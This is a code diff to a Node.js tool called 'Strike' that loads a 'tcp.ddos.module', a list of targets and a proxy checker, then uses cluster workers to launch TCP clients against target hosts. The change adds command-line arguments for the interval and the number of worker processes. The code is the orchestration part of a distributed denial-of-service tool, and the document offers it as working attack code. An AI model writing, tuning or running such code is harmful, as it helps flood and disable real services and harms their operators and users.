@@ -12,16 +12,20 @@ const ProxyChecker = require("./proxyChecker");
 const TcpClient = require("./tcp.ddos.module");
 const targets = require("./targets");
 
-const numCPUs = targets.length;
-
 class Strike {
-  constructor() {
+  #CPUsCount = 0;
+  #ms = 1000;
+
+  constructor(ms, CPUsCount) {
     this.counter = 0;
     this.eventEmitter = new EventEmitter();
     this.proxyChecker = new ProxyChecker();
+    this.#ms = ms;
+    this.#CPUsCount = CPUsCount;
   }
 
   async init() {
+    const numCPUs = this.#CPUsCount || targets.length;
     let i = 0;
 
     if (cluster.isPrimary) {
@@ -44,7 +48,7 @@ class Strike {
       });
     } else if (cluster.isWorker) {
       process.on("message", (data) => {
-        const tcpClient = new TcpClient(data.host, data.port);
+        const tcpClient = new TcpClient(data.host, data.port, this.#ms);
         tcpClient.init();
       });
       console.info("[Info]: Init instance, process id:", process.pid);
@@ -66,5 +70,6 @@ class Strike {
 }
 
 (function () {
-  new Strike().init();
+  const [,, ms, CPUsCount] = process.argv;
+  new Strike(ms, CPUsCount).init();
 })();
